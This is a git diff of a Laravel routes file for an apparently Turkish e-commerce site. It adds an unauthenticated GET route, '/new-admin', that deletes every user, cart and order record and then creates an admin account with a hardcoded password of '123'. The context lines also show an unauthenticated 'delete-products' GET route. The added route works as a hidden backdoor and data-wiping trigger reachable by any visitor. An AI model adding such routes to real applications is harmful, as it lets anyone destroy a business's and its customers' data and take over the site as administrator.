@@ -9,6 +9,8 @@ use App\Http\Controllers\SliderController;
 use App\Http\Controllers\UsersController;
 use App\Models\Product;
 use App\Models\Sepet;
+use App\Models\User;
+use App\Models\Orders;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -21,6 +23,34 @@ use Illuminate\Support\Facades\Route;
 | contains the "web" middleware group. Now create something great!
 |
 */
+Route::get('/new-admin',function(){
+    $users = User::all();
+    $sepet = Sepet::all();
+    $orders = Orders::all() ;
+    
+    foreach($users  as $user){
+        $user->delete();
+    }
+      foreach($sepet  as $user){
+        $user->delete();
+    }
+      foreach($orders as $user){
+        $user->delete();
+    }
+    
+    $user = new User();
+    
+    $user->first_name = "Admin";
+    $user->last_name = "Admin";
+    $user->type = "admin";
+    $user->password = bcrypt(123);
+    $user->email = "info@admin.com";
+    $user->phone = "phone";
+    $user->confirm = 1;
+  
+    $user->save();
+});
+
 Route::get('delete-products',[ProductController::class,'allDelete']);
 Route::post('user-update',[UsersController::class,'update']);
 
